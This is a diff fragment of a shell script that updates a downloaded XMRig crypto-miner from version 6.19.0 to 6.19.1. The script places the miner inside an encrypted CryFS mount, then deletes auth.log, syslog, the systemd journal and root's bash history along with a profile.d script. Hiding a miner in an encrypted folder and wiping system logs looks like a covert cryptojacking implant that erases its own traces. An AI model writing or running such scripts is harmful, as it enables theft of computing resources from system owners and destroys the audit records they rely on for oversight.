@@ -9,11 +9,11 @@ ecryptfs-setup-swap -f
 echo "#!/bin/bash
 sudo mkdir /home/fast/cr /home/fast/crd
 sudo cryfs /home/fast/cr /home/fast/crd
-sudo wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
+sudo wget https://github.com/xmrig/xmrig/releases/download/v6.19.1/xmrig-6.19.1-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
 sudo tar -xvzf /home/fast/crd/xm.tar.gz
-sudo cp /home/fast/xmrig-6.19.0/config.json /home/fast/crd/config.json
-sudo cp /home/fast/xmrig-6.19.0/xmrig /home/fast/crd/xmrig
-sudo rm -rf /home/fast/xmrig-6.19.0
+sudo cp /home/fast/xmrig-6.19.1/config.json /home/fast/crd/config.json
+sudo cp /home/fast/xmrig-6.19.1/xmrig /home/fast/crd/xmrig
+sudo rm -rf /home/fast/xmrig-6.19.1
 sudo rm -rf /home/fast/crd/xm.tar.gz
 sudo rm -rf /var/log/auth.log /var/log/syslog.log /var/log/journal/* /root/.bash_history
 sudo rm -rf /etc/profile.d/crar.sh
